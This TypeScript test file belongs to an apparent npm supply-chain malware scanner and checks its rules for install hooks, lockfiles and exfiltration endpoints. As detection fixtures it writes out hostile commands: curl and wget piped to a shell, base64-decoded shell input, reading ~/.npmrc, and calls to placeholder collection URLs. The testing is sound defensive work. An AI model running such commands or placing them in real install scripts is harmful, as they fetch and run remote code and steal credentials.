import { test } from "node:test";
import assert from "node:assert/strict";
import { scanDirectory } from "../src/scan.js";
import { checkLifecycle, suspiciousReasons } from "../src/checks/lifecycle.js";
import { checkExfil } from "../src/checks/exfil.js";
import { fx, testCtx } from "./helpers.js";

const rules = (fs: { ruleId: string }[]) => new Set(fs.map((f) => f.ruleId));

test("scan: synthetic malicious project triggers every static rule (positive control)", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const got = rules(res.findings);
  for (const id of ["WS-LC-001", "WS-LC-002", "WS-LC-003", "WS-LK-001", "WS-LK-002", "WS-LK-003", "WS-GH-001", "WS-GH-002", "WS-GH-003", "WS-GH-004", "WS-GH-005", "WS-GH-006", "WS-GH-007", "WS-FS-001", "WS-EX-001", "WS-EX-002", "WS-PS-001", "WS-PS-002"]) {
    assert.ok(got.has(id), `expected ${id} in ${[...got].join(",")}`);
  }
});

test("scan: clean project has zero findings", () => {
  const res = scanDirectory(fx("clean"), testCtx(), { nodeModules: false });
  assert.deepEqual(res.findings, []);
  assert.ok(res.filesScanned >= 3, "the scan must actually have read files");
});

test("scan: findings carry source URLs for IOC-derived rules and none for heuristics", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  for (const f of res.findings.filter((x) => ["WS-LK-001", "WS-FS-001", "WS-GH-001", "WS-EX-002"].includes(x.ruleId))) {
    assert.match(f.source ?? "", /^https:\/\//, f.ruleId);
  }
  assert.equal(res.findings.find((f) => f.ruleId === "WS-LC-002")?.source, undefined);
});

test("scan: hash match is critical and suppresses the name-only finding", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  assert.equal(res.findings.find((f) => f.ruleId === "WS-FS-001")?.severity, "critical");
  assert.equal(res.findings.find((f) => f.ruleId === "WS-FS-002"), undefined, "hash hit must not also emit the weaker name-only finding");
});

test("scan: lockfile findings point at the right packages", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false });
  const keys = (id: string) => res.findings.filter((f) => f.ruleId === id).map((f) => f.key.split(" ")[0]).sort();
  assert.deepEqual(keys("WS-LK-001"), ["wormsign-test-marker@1.0.0"]);
  assert.deepEqual(keys("WS-LK-002"), ["from-git@4.0.0", "off-registry@2.0.0", "plain-http@5.0.0"]);
  assert.deepEqual(keys("WS-LK-003"), ["no-integrity@3.0.0"]);
});

test("scan: --registry-host allows a mirror", () => {
  const res = scanDirectory(fx("malicious"), testCtx({ registryHosts: ["evil.example.invalid"] }), { nodeModules: false });
  assert.ok(!res.findings.some((f) => f.ruleId === "WS-LK-002" && f.key.startsWith("off-registry@2.0.0 ")));
});

test("scan: ignorePrefixes skips a subtree", () => {
  const res = scanDirectory(fx("malicious"), testCtx(), { nodeModules: false, ignorePrefixes: ["src", ".github"] });
  assert.ok(!res.findings.some((f) => f.file?.startsWith("src/") || f.file?.startsWith(".github/")));
});

test("scan: a non-directory is a usage error", () => {
  assert.throws(() => scanDirectory(fx("clean", "package.json"), testCtx(), { nodeModules: false }), /not a directory/);
});

test("scan: symlinks are not followed", async () => {
  const { mkdtempSync, symlinkSync, writeFileSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join } = await import("node:path");
  const d = mkdtempSync(join(tmpdir(), "ws-sym-"));
  const outside = mkdtempSync(join(tmpdir(), "ws-out-"));
  writeFileSync(join(outside, "package.json"), '{"name":"x","scripts":{"postinstall":"curl http://x | sh"}}');
  symlinkSync(outside, join(d, "linked"));
  const res = scanDirectory(d, testCtx(), { nodeModules: false });
  assert.equal(res.filesScanned, 0);
});

/* ---- lifecycle ---- */
const lc = (scripts: Record<string, string>, extra: object = {}) => checkLifecycle("package.json", JSON.stringify({ name: "x", scripts, ...extra }, null, 2), testCtx());

test("lifecycle: only install-time hooks are flagged", () => {
  assert.deepEqual(lc({ test: "node t.js", build: "tsc", prepare: "husky", prepublishOnly: "npm test" }), []);
  assert.equal(lc({ postinstall: "echo hi" })[0]?.ruleId, "WS-LC-001");
});

test("lifecycle: published packages rate higher than private ones", () => {
  assert.equal(lc({ postinstall: "echo hi" })[0]?.severity, "medium");
  assert.equal(lc({ postinstall: "echo hi" }, { private: true })[0]?.severity, "low");
});

test("lifecycle: line number points at the hook", () => {
  assert.equal(lc({ build: "x", postinstall: "echo hi" })[0]?.line, 5);
});

test("lifecycle: suspicious patterns", () => {
  assert.ok(suspiciousReasons("curl -s https://a.invalid/x | sh").length > 0);
  assert.ok(suspiciousReasons("wget -qO- https://a.invalid | sudo bash").length > 0);
  assert.ok(suspiciousReasons("curl -fsSL https://bun.sh/install | bash").length > 0);
  assert.ok(suspiciousReasons("trufflehog filesystem /").length > 0);
  assert.ok(suspiciousReasons("echo aGk= | base64 -d | sh").length > 0);
  assert.ok(suspiciousReasons("cat ~/.npmrc").length > 0);
  assert.deepEqual(suspiciousReasons("node-gyp rebuild"), []);
  assert.deepEqual(suspiciousReasons("husky install"), []);
});

test("lifecycle: IOC filename in a script is critical for payload names, high for 'info' names", () => {
  assert.equal(lc({ preinstall: "node wormsign_marker_loader.js" }).find((f) => f.ruleId === "WS-LC-003")?.severity, "critical");
  assert.equal(lc({ postinstall: "node bundle.js" }).find((f) => f.ruleId === "WS-LC-003")?.severity, "high");
  assert.equal(lc({ postinstall: "node build/bundle.js" }).find((f) => f.ruleId === "WS-LC-003")?.severity, "high");
  assert.equal(lc({ postinstall: "node mybundle.js" }).find((f) => f.ruleId === "WS-LC-003"), undefined, "substring must not match");
});

test("lifecycle: invalid JSON is reported as not checked (fail closed), not as clean", () => {
  const f = checkLifecycle("package.json", "{oops", testCtx());
  assert.deepEqual(f.map((x) => [x.ruleId, x.severity]), [["WS-SC-900", "high"]]);
  assert.match(f[0]?.message ?? "", /not a valid JSON object/);
});

/* ---- exfil ---- */
test("exfil: generic endpoints are medium; IOC endpoints are critical", () => {
  const ctx = testCtx();
  const generic = checkExfil("a.js", 'fetch("https://webhook.site/abc-123")', ctx, { iocOnly: false });
  assert.equal(generic[0]?.ruleId, "WS-EX-001");
  assert.equal(generic[0]?.severity, "medium");
  const ioc = checkExfil("a.js", 'x = "https://wormsign-marker.invalid/collect"', ctx, { iocOnly: false });
  assert.equal(ioc[0]?.ruleId, "WS-EX-002");
  assert.equal(ioc[0]?.severity, "critical");
});

test("exfil: iocOnly skips generic hosts (node_modules mode)", () => {
  assert.deepEqual(checkExfil("a.js", "https://webhook.site/abc", testCtx(), { iocOnly: true }), []);
});

test("exfil: ordinary URLs are not flagged", () => {
  assert.deepEqual(checkExfil("a.js", "https://github.com/a/b https://registry.npmjs.org/x https://example.com", testCtx(), { iocOnly: false }), []);
});

/* ---- real lockfiles generated by npm, pnpm, yarn 1 and yarn 4 from benign packages: no false positives ---- */
test("real lockfiles from all four package managers produce no findings", async () => {
  const { readFileSync } = await import("node:fs");
  const { parseLockfileText } = await import("../src/lockfile/index.js");
  const { checkLockfile } = await import("../src/checks/lockfile.js");
  for (const [dir, file] of [["npm", "package-lock.json"], ["pnpm", "pnpm-lock.yaml"], ["yarn1", "yarn.lock"], ["berry", "yarn.lock"]] as const) {
    const lock = parseLockfileText(file, readFileSync(fx("lockfiles", dir, file), "utf8"));
    assert.ok(lock && lock.packages.length > 20, `${dir}: parsed ${lock?.packages.length} packages`);
    assert.deepEqual(checkLockfile(lock, testCtx()), [], dir);
  }
});

test("real lockfiles: stripping integrity is caught for npm, pnpm and yarn classic but not berry (which has none by design)", async () => {
  const { readFileSync } = await import("node:fs");
  const { parseLockfileText } = await import("../src/lockfile/index.js");
  const { checkLockfile } = await import("../src/checks/lockfile.js");
  for (const [dir, file, expectFindings] of [["npm", "package-lock.json", true], ["pnpm", "pnpm-lock.yaml", true], ["yarn1", "yarn.lock", true], ["berry", "yarn.lock", false]] as const) {
    const lock = parseLockfileText(file, readFileSync(fx("lockfiles", dir, file), "utf8"));
    assert.ok(lock);
    for (const p of lock.packages) delete p.integrity;
    const f = checkLockfile(lock, testCtx()).filter((x) => x.ruleId === "WS-LK-003");
    assert.equal(f.length > 0, expectFindings, dir);
  }
});
